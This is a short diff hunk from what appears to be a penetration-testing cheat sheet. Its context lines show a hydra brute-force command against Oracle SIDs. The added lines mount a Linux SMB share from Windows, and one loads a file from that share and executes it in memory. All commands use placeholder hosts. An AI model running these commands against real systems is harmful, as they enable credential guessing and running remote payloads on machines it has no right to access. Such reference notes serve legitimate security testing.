@@ -1757,8 +1757,11 @@ hydra -L SID_wordlist_here -s 1521 IP_here oracle-sid
 New-PSDrive -Name "share_name_here_can_be_different_from_above" -PSProvider "FileSystem" -Root "\\Lin_IP_here\share_name_here"
 ### cmd
 net use unused_letter_here: \\Lin_IP_here\share_name_here
+net use \\Lin_IP_here\share_name_here
 ## access drive
 cd \\Lin_IP_here\share_name_here_can_be_different_from_above\
+## load file from share + execute in memory
+//Lin_IP_here/share_here/file_here arg_here
 ```
 
 
